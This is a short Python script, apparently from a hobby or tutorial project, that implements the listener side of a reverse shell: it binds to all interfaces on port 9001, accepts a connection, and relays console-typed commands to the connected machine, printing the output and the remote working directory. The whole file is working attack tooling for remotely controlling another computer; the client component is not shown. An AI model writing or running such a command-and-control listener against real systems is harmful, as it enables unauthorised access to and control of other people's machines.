import socket


HOST = "0.0.0.0"    # Hardcoded to listen on all interfaces. Improvement ideas: Take this value from commandline
PORT = 9001         # Hardcoded Port. Improvement idea: Take this value from commandline
MESSAGE_SIZE = 1024 * 128 # size of messages. Can be anything. 1024 = 1kb. 1024 * 128 = 128kb

SEPERATOR = '<sep>' # seperator for sen ding multiple messages at once


s = socket.socket() # Create socket object

s.bind((HOST, PORT)) # bind socket to specified host and port

s.listen(5) # start listening
print(f"Waiting for connections...")

client_socket, client_address = s.accept() # handle new incoming connections
print(f"New connection from {client_address[0]}:{client_address[1]}")

cwd = client_socket.recv(MESSAGE_SIZE).decode() # recieve initial message with client cwd
print("[+] Current Working Directory: ", cwd)

while True:
    cmd = input(f"{cwd} $> ") # take command from cli
    if not cmd.strip(): # if empty command
        continue

    client_socket.send(cmd.encode()) # send cmd to client
    if cmd.lower() == "exit": #if cmd is exit
        break

    output = client_socket.recv(MESSAGE_SIZE).decode() # recieve and decode command results

    results, cwd = output.split(SEPERATOR) # split cwd and results

    print(results)
